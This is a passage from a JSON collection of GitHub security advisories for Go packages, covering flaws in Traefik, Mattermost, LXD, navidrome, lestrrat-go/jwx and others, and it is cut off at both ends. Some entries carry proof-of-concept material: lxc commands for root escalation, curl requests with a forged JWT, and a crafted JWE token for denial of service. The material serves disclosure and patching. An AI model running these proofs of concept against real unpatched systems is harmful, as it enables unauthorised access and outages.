"https://nvd.nist.gov/vuln/detail/CVE-2016-15036"}, {"type": "WEB", "url": "https://github.com/deis/workflow-manager/pull/94"}, {"type": "WEB", "url": "https://github.com/deis/workflow-manager/commit/31fe3bccbdde134a185752e53380330d16053f7f"}, {"type": "WEB", "url": "https://github.com/deis/workflow-manager/releases/tag/v2.3.3"}, {"type": "WEB", "url": "https://vuldb.com/?ctiid.248847"}, {"type": "WEB", "url": "https://vuldb.com/?id.248847"}], "database_specific": {"cwe_ids": ["CWE-362"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-12-27T15:06:30Z", "nvd_published_at": "2023-12-23T20:15:37Z"}}, {"schema_version": "1.4.0", "id": "GHSA-8g85-whqh-cr2f", "modified": "2023-12-05T18:12:37Z", "published": "2023-12-05T18:12:37Z", "aliases": ["CVE-2023-47124"], "summary": "Traefik vulnerable to potential DDoS via ACME HTTPChallenge", "details": "## Impact\n\nThere is a potential vulnerability in Traefik managing the ACME HTTP challenge.\n\nWhen Traefik is configured to use the [HTTPChallenge](https://doc.traefik.io/traefik/https/acme/#httpchallenge) to generate and renew the Let's Encrypt TLS certificates, the delay authorized to solve the challenge (50 seconds) can be exploited by attackers ([slowloris attack](https://www.cloudflare.com/learning/ddos/ddos-attack-tools/slowloris/)).\n \n## Patches\n\n- https://github.com/traefik/traefik/releases/tag/v2.10.6\n- https://github.com/traefik/traefik/releases/tag/v3.0.0-beta5\n\n## Workarounds\n\nReplace the HTTPChallenge with the [TLSChallenge](https://doc.traefik.io/traefik/https/acme/#tlschallenge) or the [DNSChallenge](https://doc.traefik.io/traefik/https/acme/#dnschallenge).\n\n## For more information\n\nIf you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/traefik/traefik/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.10.6"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/traefik/traefik/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "3.0.0-beta5"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/traefik/traefik/security/advisories/GHSA-8g85-whqh-cr2f"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-47124"}, {"type": "WEB", "url": "https://doc.traefik.io/traefik/https/acme/#dnschallenge"}, {"type": "WEB", "url": "https://doc.traefik.io/traefik/https/acme/#httpchallenge"}, {"type": "WEB", "url": "https://doc.traefik.io/traefik/https/acme/#tlschallenge"}, {"type": "PACKAGE", "url": "https://github.com/traefik/traefik"}, {"type": "WEB", "url": "https://github.com/traefik/traefik/releases/tag/v2.10.6"}, {"type": "WEB", "url": "https://github.com/traefik/traefik/releases/tag/v3.0.0-beta5"}, {"type": "WEB", "url": "https://www.cloudflare.com/learning/ddos/ddos-attack-tools/slowloris/"}], "database_specific": {"cwe_ids": ["CWE-400", "CWE-772"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-12-05T18:12:37Z", "nvd_published_at": "2023-12-04T21:15:33Z"}}, {"schema_version": "1.4.0", "id": "GHSA-hj4r-2c9c-29h3", "modified": "2023-12-19T21:11:31Z", "published": "2023-12-12T21:31:12Z", "aliases": ["CVE-2023-49922"], "summary": "Elastic Beats inserts sensitive information into log file", "details": "An issue was discovered by Elastic whereby Beats and Elastic Agent would log a raw event in its own logs at the WARN or ERROR level if ingesting that event to Elasticsearch failed with any 4xx HTTP status code except 409 or 429. Depending on the nature of the event that Beats or Elastic Agent attempted to ingest, this could lead to the insertion of sensitive or private information in the Beats or Elastic Agent logs. Elastic has released 8.11.3 and 7.17.16 that prevents this issue by limiting these types of logs to DEBUG level logging, which is disabled by default.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/elastic/beats/v7"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "7.17.16"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/elastic/beats"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "8.0.0"}, {"fixed": "8.11.3"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-49922"}, {"type": "WEB", "url": "https://github.com/elastic/beats/commit/9bd7de84ab9c31bb4e1c0a348a7b7c26817a0996"}, {"type": "WEB", "url": "https://discuss.elastic.co/t/beats-and-elastic-agent-8-11-3-7-17-16-security-update-esa-2023-30/349180"}, {"type": "PACKAGE", "url": "https://github.com/elastic/beats"}], "database_specific": {"cwe_ids": ["CWE-532"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-12-19T21:11:31Z", "nvd_published_at": "2023-12-12T19:15:08Z"}}, {"schema_version": "1.4.0", "id": "GHSA-99jv-8292-2hpm", "modified": "2023-12-08T21:57:27Z", "published": "2023-12-08T21:57:27Z", "aliases": [], "summary": "eventing-gitlab vulnerable to denial of service, caused by improper enforcement of the timeout on individual read operations", "details": "### Impact\n\nThe eventing-gitlab cluster-local server doesn't set `ReadHeaderTimeout`\u202c\u202d which could lead do a DDoS\u202c \u202dattack, where a large group of users send requests to the server causing the server to hang\u202c \u202dfor long enough to deny it from being available to other users, also know as a Slowloris\u202c \u202dattack.\n\n### Patches\n\nFix in `v1.12.1` and `v1.11.3`.\n\n\n### Credits\n\nThe vulnerability was reported by Ada Logics during an ongoing security audit of Knative involving Ada Logics, the Knative maintainers, OSTIF and CNCF.\n", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "knative.dev/eventing-gitlab"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "0.39.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/knative-extensions/eventing-gitlab/security/advisories/GHSA-99jv-8292-2hpm"}, {"type": "WEB", "url": "https://github.com/knative-extensions/eventing-gitlab/commit/463fcb36ac31cdac34eda0e900b64039d6d30b36"}, {"type": "WEB", "url": "https://github.com/knative-extensions/eventing-gitlab/commit/db76c668aa47890e7fe73c9df3135da292cfd9ec"}, {"type": "PACKAGE", "url": "https://github.com/knative-extensions/eventing-gitlab"}], "database_specific": {"cwe_ids": [], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2023-12-08T21:57:27Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-4rgc-5g6r-2rjf", "modified": "2023-12-12T00:58:29Z", "published": "2023-12-12T00:58:29Z", "aliases": [], "summary": "lakeFS logs S3 credentials in plain text", "details": "### Impact\n\nS3 credentials are logged in plain text\n\n```\nS3Creds:{Key:AKIAIOSFODNN7EXAMPLE Secret:wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n```\n\nappears as part of the log message: \n\n```\ntime=\"2023-05-12T13:51:52Z\" level=error msg=\"failed to perform diff\" func=\"pkg/plugins/diff.(*Service).RunDiff\" file=\"build/pkg/plugins/diff/service.go:124\" error=\"rpc error: code = Canceled desc = stream terminated by RST_STREAM with error code: CANCEL\" host=\"localhost:8000\" method=GET operation_id=OtfDiff params=\"{TablePaths:{Left:{Ref:data_load@ Path:aggs/agg_variety/} Right:{Ref:data_load Path:aggs/agg_variety/} Base:{Ref: Path:}} S3Creds:{Key:AKIAIOSFODNN7EXAMPLE Secret:wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY Endpoint:http://0.0.0.0:8000} Repo:example}\" path=\"/api/v1/repositories/example/otf/refs/data_load%40/diff/data_load?table_path=aggs%2Fagg_variety%2F&type=delta\" request_id=d3b6fdc7-2544-4c12-8e05-376f16e35a80 service_name=rest_api type=delta user=docker\n```\n\nDiscovered when investigating [#5862](https://github.com/treeverse/lakeFS/issues/5862)\n\n\n### Patches\n_Has the problem been patched? What versions should users upgrade to?_\n\nNo\n\n### Workarounds\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\n\ndisable all logging? \n\n### References\n_Are there any links users can visit to find out more?_\n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/treeverse/lakefs"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.101.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/treeverse/lakeFS/security/advisories/GHSA-4rgc-5g6r-2rjf"}, {"type": "PACKAGE", "url": "https://github.com/treeverse/lakeFS"}], "database_specific": {"cwe_ids": ["CWE-312"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-12-12T00:58:29Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-7664-hcp7-f497", "modified": "2023-12-12T21:39:48Z", "published": "2023-12-06T09:30:17Z", "aliases": ["CVE-2023-6458"], "summary": "Mattermost Injection vulnerability", "details": "Mattermost webapp fails to validate\u00a0route parameters in/<TEAM_NAME>/channels/<CHANNEL_NAME>\u00a0allowing an attacker to perform a client-side path traversal.\n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:L/I:H/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "7.8.14"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost/server/v8"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "8.1.5"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost/server/v8"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "9.0.0"}, {"fixed": "9.0.3"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost/server"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "9.1.0"}, {"fixed": "9.1.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-6458"}, {"type": "PACKAGE", "url": "https://github.com/mattermost/mattermost"}, {"type": "WEB", "url": "https://mattermost.com/security-updates"}], "database_specific": {"cwe_ids": ["CWE-22", "CWE-74"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-12-08T21:57:03Z", "nvd_published_at": "2023-12-06T09:15:08Z"}}, {"schema_version": "1.4.0", "id": "GHSA-8j98-cjfr-qx3h", "modified": "2023-12-05T23:30:56Z", "published": "2023-12-05T23:30:56Z", "aliases": ["CVE-2023-49292"], "summary": "github.com/ecies/go vulnerable to possible private key restoration", "details": "### Impact\nIf functions `Encapsulate()`, `Decapsulate()` and `ECDH()` could be called by an attacker, he could recover any private key that he interacts with.\n\n### Patches\nPatched in v2.0.8\n\n### Workarounds\nYou could manually check public key by calling `IsOnCurve()` function from secp256k1 libraries.\n\n### References\nhttps://github.com/ashutosh1206/Crypton/blob/master/Diffie-Hellman-Key-Exchange/Attack-Invalid-Curve-Point/README.md\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ecies/go/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.0.8"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/ecies/go/security/advisories/GHSA-8j98-cjfr-qx3h"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-49292"}, {"type": "WEB", "url": "https://github.com/ecies/go/commit/c6e775163866d6ea5233eb8ec8530a9122101ebd"}, {"type": "WEB", "url": "https://github.com/ashutosh1206/Crypton/blob/master/Diffie-Hellman-Key-Exchange/Attack-Invalid-Curve-Point/README.md"}, {"type": "PACKAGE", "url": "https://github.com/ecies/go"}, {"type": "WEB", "url": "https://github.com/ecies/go/releases/tag/v2.0.8"}], "database_specific": {"cwe_ids": ["CWE-200"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-12-05T23:30:56Z", "nvd_published_at": "2023-12-05T00:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-x9qq-236j-gj97", "modified": "2023-12-05T23:32:58Z", "published": "2023-12-05T23:32:58Z", "aliases": [], "summary": "Canonical LXD documentation improvement to make clear restricted.devices.disk=allow without restricted.devices.disk.paths also allows shift=true", "details": "### Summary\n\nIf a user has restricted access to a project that is configured with `restricted=true`, they can gain root access on the system by creating a disk device with `shift=true` and creating a setuid root executable. This is possible because the `shift` property is not restricted unless `restricted.devices.disk.paths` is set.\n\n### Details\n\nThe following patch shows the offending code with a possible fix:\n```patch\n--- a/lxd/device/disk.go\n+++ b/lxd/device/disk.go\n@@ -429,17 +429,19 @@ func (d *disk) validateEnvironmentSourcePath() error {\n        if instProject.Name != api.ProjectDefaultName {\n                // If restricted disk paths are in force, then check the disk's source is allowed, and record the\n                // allowed parent path for later user during device start up sequence.\n-               if shared.IsTrue(instProject.Config[\"restricted\"]) && instProject.Config[\"restricted.devices.disk.paths\"] != \"\" {\n-                       allowed, restrictedParentSourcePath := project.CheckRestrictedDevicesDiskPaths(instProject.Config, d.config[\"source\"])\n-                       if !allowed {\n-                               return fmt.Errorf(\"Disk source path %q not allowed by project for disk %q\", d.config[\"source\"], d.name)\n+               if shared.IsTrue(instProject.Config[\"restricted\"]) {\n+                       if instProject.Config[\"restricted.devices.disk.paths\"] != \"\" {\n+                               allowed, restrictedParentSourcePath := project.CheckRestrictedDevicesDiskPaths(instProject.Config, d.config[\"source\"])\n+                               if !allowed {\n+                                       return fmt.Errorf(\"Disk source path %q not allowed by project for disk %q\", d.config[\"source\"], d.name)\n+                               }\n+\n+                               d.restrictedParentSourcePath = shared.HostPath(restrictedParentSourcePath)\n                        }\n\n                        if shared.IsTrue(d.config[\"shift\"]) {\n                                return fmt.Errorf(`The \"shift\" property cannot be used with a restricted source path`)\n                        }\n-\n-                       d.restrictedParentSourcePath = shared.HostPath(restrictedParentSourcePath)\n                }\n        }\n```\n\n### PoC\n\n```bash\n$ lxc project create restricted -c restricted=true -c restricted.devices.disk=allow\n$ lxc project switch restricted\n$ lxc profile device add default root disk path=/ pool=default\n$ lxc init ubuntu:22.04 c1\n$ lxc config device add c1 d1 disk source=/ path=/mnt shift=true\n$ lxc start c1  # no error\n\n$ lxc project set restricted restricted.devices.disk.paths=/  # explicitly allow mounting /\n$ lxc restart c1\nError: Failed to start device \"d1\": The \"shift\" property cannot be used with a restricted source path\n```\n\nCreated https://github.com/canonical/lxd/issues/12606 to improve the documentation as per https://github.com/canonical/lxd/security/advisories/GHSA-x9qq-236j-gj97#advisory-comment-91918", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/canonical/lxd"}, "versions": ["5.19"]}], "references": [{"type": "WEB", "url": "https://github.com/canonical/lxd/security/advisories/GHSA-x9qq-236j-gj97"}, {"type": "WEB", "url": "https://github.com/canonical/lxd/issues/12606"}, {"type": "PACKAGE", "url": "https://github.com/canonical/lxd"}], "database_specific": {"cwe_ids": [], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2023-12-05T23:32:58Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-7ww5-4wqc-m92c", "modified": "2023-12-19T21:17:06Z", "published": "2023-12-19T21:17:06Z", "aliases": [], "summary": "containerd allows RAPL to be accessible to a container", "details": "# /sys/devices/virtual/powercap accessible by default to containers\n\nIntel's RAPL (Running Average Power Limit) feature, introduced by the Sandy Bridge microarchitecture, provides software insights into hardware energy consumption. To facilitate this, Intel introduced the powercap framework in Linux kernel 3.13, which reads values via relevant MSRs (model specific registers) and provides unprivileged userspace access via `sysfs`. As RAPL is an interface to access a hardware feature, it is only available when running on bare metal with the module compiled into the kernel.\n\nBy 2019, it was realized that in some cases unprivileged access to RAPL readings could be exploited as a power-based side-channel against security features including AES-NI (potentially inside a SGX enclave) and KASLR (kernel address space layout randomization). Also known as the [PLATYPUS attack](https://platypusattack.com/), Intel assigned [CVE-2020-8694](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8694) and [CVE-2020-8695](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8695), and AMD assigned [CVE-2020-12912](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-12912).\n\nSeveral mitigations were applied; Intel reduced the sampling resolution via a microcode update, and the Linux kernel [prevents access by non-root users](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=949dd0104c496fa7c14991a23c03c62e44637e71) since 5.10. However, this kernel-based mitigation does not apply to many container-based scenarios:\n* Unless using user namespaces, root inside a container has the same level of privilege as root outside the container, but with a slightly more narrow view of the system\n* `sysfs` is mounted inside containers read-only; however only read access is needed to carry out this attack on an unpatched CPU\n\nWhile this is not a direct vulnerability in container runtimes, defense in depth and safe defaults are valuable and preferred, especially as this poses a risk to multi-tenant container environments. This is provided by masking `/sys/devices/virtual/powercap` in the default mount configuration, and adding an additional set of rules to deny it in the default AppArmor profile.\n\nWhile `sysfs` is not the only way to read from the RAPL subsystem, other ways of accessing it require additional capabilities such as `CAP_SYS_RAWIO` which is not available to containers by default, or `perf` paranoia level less than 1, which is a non-default kernel tunable.\n\n## References\n\n* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8694\n* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8695\n* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-12912\n* https://platypusattack.com/\n* https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=949dd0104c496fa7c14991a23c03c62e44637e71\n* https://web.eece.maine.edu/~vweaver/projects/rapl/", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/containerd/containerd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.6.26"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.6.25"}}, {"package": {"ecosystem": "Go", "name": "github.com/containerd/containerd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.7.0"}, {"fixed": "1.7.11"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.7.10"}}], "references": [{"type": "WEB", "url": "https://github.com/containerd/containerd/security/advisories/GHSA-7ww5-4wqc-m92c"}, {"type": "WEB", "url": "https://github.com/containerd/containerd/commit/67d356cb3095f3e8f8ad7d36f9a733fea1e7e28c"}, {"type": "WEB", "url": "https://github.com/containerd/containerd/commit/746b910f05855c8bfdb4415a1c0f958b234910e5"}, {"type": "PACKAGE", "url": "https://github.com/containerd/containerd"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-12-19T21:17:06Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-j3rq-4xjw-xg63", "modified": "2023-12-04T23:13:42Z", "published": "2023-12-04T23:13:42Z", "aliases": [], "summary": "Go package github.com/edgelesssys/marblerun CLI commands susceptible to MITM attacks", "details": "### Impact\nAny CLI command issued to a Coordinator after the Manifest has been set, is susceptible to be redirected to another MarbleRun Coordinator instance, which runs the same binary, but potentially a different manifest.\n\n### Patches\n The issue has been patched in [`v1.4.0`](https://github.com/edgelesssys/marblerun/releases/tag/v1.4.0)\n\n### Workarounds\n\nDirectly using the REST API of the Coordinator and manually verifying and pinning the certificate to a set Manifest avoids the issue.\n", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/edgelesssys/marblerun"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.4.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/edgelesssys/marblerun/security/advisories/GHSA-j3rq-4xjw-xg63"}, {"type": "PACKAGE", "url": "https://github.com/edgelesssys/marblerun"}, {"type": "WEB", "url": "https://github.com/edgelesssys/marblerun/releases/tag/v1.4.0"}], "database_specific": {"cwe_ids": ["CWE-300"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-12-04T23:13:42Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-wq59-4q6r-635r", "modified": "2023-12-21T15:58:09Z", "published": "2023-12-19T23:37:45Z", "aliases": ["CVE-2023-51442"], "summary": "Authentication bypass vulnerability in navidrome's subsonic endpoint", "details": "### Summary\n\nA security vulnerability has been identified in navidrome's subsonic endpoint, allowing for authentication bypass. This exploit enables unauthorized access to any known account by utilizing a JSON Web Token (JWT) signed with the key \"not so secret\".\n\nThe vulnerability can only be exploited on instances that have never been restarted.\n\n### Details\n\nNavidrome supports an extension to the subsonic authentication scheme, where a JWT can be provided using a `jwt` query parameter instead of the traditional password or token and salt (corresponding to resp. the `p` or `t` and `s` query parameters).\n\nDuring the first initialization, navidrome generates a random key that is then used by the authentication module to validate JWTs before extracting the username from the `sub` claim. If for some reason the key cannot be retrieved by the initialization code, a hardcoded value is used instead: \"not so secret\".\n\nA bug in the order of operations during navidrome startup results in the authentication module initializing before the module responsible for generating and persisting the random key. As a consequence, the authentication module falls back to using the hardcoded value, which remains in use until the instance gets restarted. Additionally, an error that was meant to be logged when the fallback value is used does not get logged due to another bug, preventing the operator from becoming aware of the issue.\n\nThe flaw allows the creation of a JWT with the `sub` claim set to any existing user on the server, signed with the key \"not so secret\", which can then be used to authenticate against the subsonic endpoint with the chosen user's privileges.\n\nAfter navidrome is restarted, the random key generated during the previous startup is loaded and the flaw becomes inexploitable.\n\n### PoC\n\nGenerate a JWT token with the subject \"admin\", and key \"not so secret\" (e.g. online on: http://jwtbuilder.jamiekurtz.com; the other parameters can be left in, it doesn't seem that navidrome validates anything). In a shell, assign the token to the variable `JWT` (for the curl commands below).\n\n```\n$ podman run -d --name navidrome -p 127.0.0.1:4533:4533 -e ND_DEVAUTOCREATEADMINPASSWORD=password docker.io/deluan/navidrome:0.50.1\n$ curl \"http://localhost:4533/rest/ping.view?c=dummy&v=1&u=admin&jwt=$JWT\"\n<subsonic-response xmlns=\"http://subsonic.org/restapi\" status=\"ok\" version=\"1.16.1\" type=\"navidrome\" serverVersion=\"0.50.1 (f69c27d1)\" openSubsonic=\"true\"></subsonic-response>\n```\n\nThe `ND_DEVAUTOCREATEADMINPASSWORD` parameter does not influence the bypass, it also works if the admin or extra users are created manually after starting navidrome.\n\nRestarting navidrome prevents the bypass:\n\n```\n$ podman restart navidrome\n$ curl \"http://localhost:4533/rest/ping.view?c=dummy&v=1&u=admin&jwt=$JWT\"\n<subsonic-response xmlns=\"http://subsonic.org/restapi\" status=\"failed\" version=\"1.16.1\" type=\"navidrome\" serverVersion=\"0.50.1 (f69c27d1)\" openSubsonic=\"true\"><error code=\"40\" message=\"Wrong username or password\"></error></subsonic-response>\n```\n\n### Impact\n\nThis authentication bypass vulnerability potentially affects all instances that don't protect the subsonic endpoint `/rest/`, which is expected to be most instances in a standard deployment, and most instances in the reverse proxy setup too (as the documentation mentions to leave that endpoint unprotected).\n\nThe impact is limited by the fact that the flaw becomes inexploitable after a first restart, and the attacker needs to know the username of existing users on the instance.\n\nFor each known user, the attacker could mess with (create/delete/change) playlists, bookmarks, media annotations, shares (which are currently global) and radios. He is also able to get the user's email address (which is PII) with the `getUser` operation. And lastly he can use the media retrieval operations which could potentially affect the availability of the system.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/navidrome/navidrome"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.50.2"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.50.1"}}], "references": [{"type": "WEB", "url": "https://github.com/navidrome/navidrome/security/advisories/GHSA-wq59-4q6r-635r"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-51442"}, {"type": "WEB", "url": "https://github.com/navidrome/navidrome/commit/1132abb0135d1ecaebc41ed97a1e908a4ae02f7c"}, {"type": "PACKAGE", "url": "https://github.com/navidrome/navidrome"}], "database_specific": {"cwe_ids": ["CWE-287"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-12-19T23:37:45Z", "nvd_published_at": "2023-12-21T15:15:13Z"}}, {"schema_version": "1.4.0", "id": "GHSA-wpmx-564x-h2mh", "modified": "2023-12-28T21:16:57Z", "published": "2023-12-28T21:16:57Z", "aliases": ["CVE-2023-52081"], "summary": "ewen-lbh/ffcss Late-Unicode normalization vulnerability", "details": "### Summary\nThe function `lookupPreprocess()` is meant to apply some transformations to a string by disabling characters in the regex `[-_ .]`. However, due to the use of late Unicode normalization of type NFKD, it is possible to bypass that validation and re-introduce all the characters in the regex `[-_ .]`. \n\n```go\n// lookupPreprocess applies transformations to s so that it can be compared\n// to search for something.\n// For example, it is used by (ThemeStore).Lookup\nfunc lookupPreprocess(s string) string {\n\treturn strings.ToLower(norm.NFKD.String(regexp.MustCompile(`[-_ .]`).ReplaceAllString(s, \"\")))\n}\n``` \n\nTake the following equivalent Unicode character U+2024 (\u2024). Initially, the `lookupPreprocess()` function would compile the regex and replace the regular dot (.). However, the U+2024 (\u2024) would bypass the `ReplaceAllString()`. When the normalization operation is applied to U+2024 (\u2024), the resulting character will be U+002E (.). Thus, the dot was reintroduced back.\n\n### Impact\n\nThe `lookupPreprocess()` can be easily bypassed with equivalent Unicode characters like U+FE4D (\ufe4d), which would result in the omitted U+005F (_), for instance. It should be noted here that the variable `s` is user-controlled data coming from [/cmd/ffcss/commands.go#L22-L28](https://github.com/ewen-lbh/ffcss/blob/master/cmd/ffcss/commands.go#L22-L28) the command args. The `lookupPreprocess()` function is only ever used to search for themes loosely (case insensitively, while ignoring dashes, underscores and dots), so the actual security impact is classified as low.\n\n### Remediation\n\nA simple fix would be to initially perform the Unicode normalization and then the rest of validations.\n\n### References\n\n - https://sim4n6.beehiiv.com/p/unicode-characters-bypass-security-checks\n", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ewen-lbh/ffcss"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.2.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/ewen-lbh/ffcss/security/advisories/GHSA-wpmx-564x-h2mh"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-52081"}, {"type": "WEB", "url": "https://github.com/ewen-lbh/ffcss/commit/f9c491874b858a32fcae15045f169fd7d02f90dc"}, {"type": "PACKAGE", "url": "https://github.com/ewen-lbh/ffcss"}], "database_specific": {"cwe_ids": ["CWE-176"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2023-12-28T21:16:57Z", "nvd_published_at": "2023-12-28T16:16:02Z"}}, {"schema_version": "1.4.0", "id": "GHSA-7f9x-gw85-8grf", "modified": "2023-12-05T23:29:26Z", "published": "2023-12-05T23:29:26Z", "aliases": ["CVE-2023-49290"], "summary": "lestrrat-go/jwx's malicious parameters in JWE can cause a DOS", "details": "### Summary\ntoo high p2c parameter in JWE's alg PBES2-* could lead to a DOS attack\n\n### Details\nThe JWE key management algorithms based on PBKDF2 require a JOSE Header Parameter called p2c (PBES2 Count). This parameter dictates the number of PBKDF2 iterations needed to derive a CEK wrapping key. Its primary purpose is to intentionally slow down the key derivation function, making password brute-force and dictionary attacks more resource- intensive.\nTherefore, if an attacker sets the p2c parameter in JWE to a very large number, it can cause a lot of computational consumption, resulting in a DOS attack\n\n### PoC\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"github.com/lestrrat-go/jwx/v2/jwa\"\n\t\"github.com/lestrrat-go/jwx/v2/jwe\"\n\t\"github.com/lestrrat-go/jwx/v2/jwk\"\n)\n\nfunc main() {\n\ttoken := []byte(\"eyJhbGciOiJQQkVTMi1IUzI1NitBMTI4S1ciLCJlbmMiOiJBMjU2R0NNIiwicDJjIjoyMDAwMDAwMDAwLCJwMnMiOiJNNzczSnlmV2xlX2FsSXNrc0NOTU9BIn0=.S8B1kXdIR7BM6i_TaGsgqEOxU-1Sgdakp4mHq7UVhn-_REzOiGz2gg.gU_LfzhBXtQdwYjh.9QUIS-RWkLc.m9TudmzUoCzDhHsGGfzmCA\")\n\tkey, err := jwk.FromRaw([]byte(`abcdefg`))\n\tpayload, err := jwe.Decrypt(token, jwe.WithKey(jwa.PBES2_HS256_A128KW, key))\n\tif err == nil {\n\t\tfmt.Println(string(payload))\n\t}\n}\n\n```\n\n### Impact\nIt's a kind of Dos attack, the user's environment could potentially utilize an excessive amount of CPU resources.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/lestrrat-go/jwx/v2/jwe"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.0.18"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/lestrrat-go/jwx/jwe"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.2.27"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/lestrrat-go/jwx/security/advisories/GHSA-7f9x-gw85-8grf"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-49290"}, {"type": "WEB", "url": 